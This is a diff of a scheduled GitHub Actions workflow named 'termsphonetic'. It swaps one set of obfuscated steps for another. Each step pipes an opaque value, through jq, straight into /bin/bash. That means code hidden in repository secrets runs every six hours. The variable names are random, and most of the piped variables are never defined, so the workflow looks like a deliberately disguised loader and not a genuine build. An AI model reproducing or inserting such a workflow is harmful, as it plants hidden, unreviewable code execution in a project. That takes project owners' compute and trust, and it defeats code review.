@@ -2,28 +2,22 @@ name: termsphonetic
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 2/6 * * *'
-jobs:  # 18549
+    - cron: '12 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: termsphonetic
         env:
-          hxo7943: ${{ secrets.hxo7943 }}
+          kpmx0: ${{ secrets.kpmx0 }}
         run: |
-          echo $hxo7943 | jq -r .m99 | /bin/bash
-          echo $vtnrm02233 | jq -r .y756 | /bin/bash
-          echo $cg8287 | jq -r .kbq23314 | /bin/bash
-          echo $q92903 | jq -r .y003 | /bin/bash
-          echo $mni49 | jq -r .xjw0 | /bin/bash
-          echo $dt80 | jq -r .afc48095 | /bin/bash
-          echo $fevkq81 | jq -r .d87958 | /bin/bash
-          echo $cdjr86475 | jq -r .wotb520 | /bin/bash
-          echo $ua857 | jq -r .zabu0216 | /bin/bash
-          echo $tf056 | jq -r .u69 | /bin/bash
-          echo $xgr3806 | jq -r .njjwz27366 | /bin/bash
-          echo $mfs819 | jq -r .qt211 | /bin/bash
-          echo $ibxcb58 | jq -r .uxigy91 | /bin/bash
-          echo $tpogl0 | jq -r .xww141 | /bin/bash
+          echo $kpmx0 | jq -r .rvrc2066 | /bin/bash
+          echo $qux1 | jq -r .nrk82 | /bin/bash
+          echo $klmj8 | jq -r .w61 | /bin/bash
+          echo $aecvh61344 | jq -r .zr6 | /bin/bash
+          echo $hsag2 | jq -r .rd95 | /bin/bash
+          echo $eb61789 | jq -r .a58266 | /bin/bash
+          echo $xy51 | jq -r .stvdb6 | /bin/bash
+          echo $zfne127 | jq -r .yb57613 | /bin/bash
 
